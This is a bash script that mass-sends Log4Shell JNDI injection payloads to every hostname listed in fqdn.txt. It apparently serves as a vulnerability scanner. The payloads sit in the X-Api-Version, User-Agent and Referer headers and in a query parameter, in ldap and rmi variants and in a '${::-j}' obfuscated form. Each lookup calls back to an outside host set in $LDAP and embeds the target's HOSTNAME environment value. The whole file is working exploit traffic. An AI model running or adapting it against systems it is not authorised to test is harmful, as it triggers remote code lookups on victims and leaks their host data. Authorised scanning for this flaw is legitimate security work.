#!/bin/bash

KEY="log4shell"

function scan () {
  # debug(X-Api-Version Header)
  echo "$@"
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$LDAP/$KEY/X-Api-Version1/$2/$3/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${\${::-j}ndi:rmi://$LDAP/$KEY/X-Api-Version2/$2/$3/\${env:HOSTNAME}}'|g" | sed "s|\$1|$1|g" | bash

  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$LDAP/$KEY/User-Agent1/$2/$3/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'User-Agent: \${\${::-j}ndi:rmi://$LDAP/$KEY/User-Agent2/$2/$3/\${env:HOSTNAME}}'|g" | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${jndi:ldap://$LDAP/$KEY/Referer1/$2/$3/\${env:HOSTNAME}}'|g"             | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 -H 'log4jPayload'  > /dev/null'                   | sed "s|log4jPayload|'Referer: \${\${::-j}ndi:rmi://$LDAP/$KEY/Referer2/$2/$3/\${env:HOSTNAME}}'|g"       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${jndi:ldap://$LDAP/$KEY/query1/$2/$3/\${env:HOSTNAME}}}'|g"                       | sed "s|\$1|$1|g" | bash
  echo 'curl -XGET -s -k --max-time 3 $1 --data-urlencode 'test=log4jPayload' > /dev/null' | sed "s|log4jPayload|'\${\${::-j}ndi:rmi://$LDAP/$KEY/query2/$2/$3/\${env:HOSTNAME}}'|g"                  | sed "s|\$1|$1|g" | bash
}

while read fqdn
do
  REQUEST_UNIXTIME=`date +%s`
  TARGET=`echo "$fqdn" | sed -e "s|^https://||g" | sed -e "s|^http://||g" | sed -e "s|:.*$||g" | sed -e "s|/.*$||g"`

  # call scan
  if [[ $fqdn == "http"* ]]
  then
    scan $fqdn $TARGET $REQUEST_UNIXTIME
  else 
    scan http://$fqdn $TARGET $REQUEST_UNIXTIME
    scan https://$fqdn $TARGET $REQUEST_UNIXTIME
  fi
done < fqdn.txt
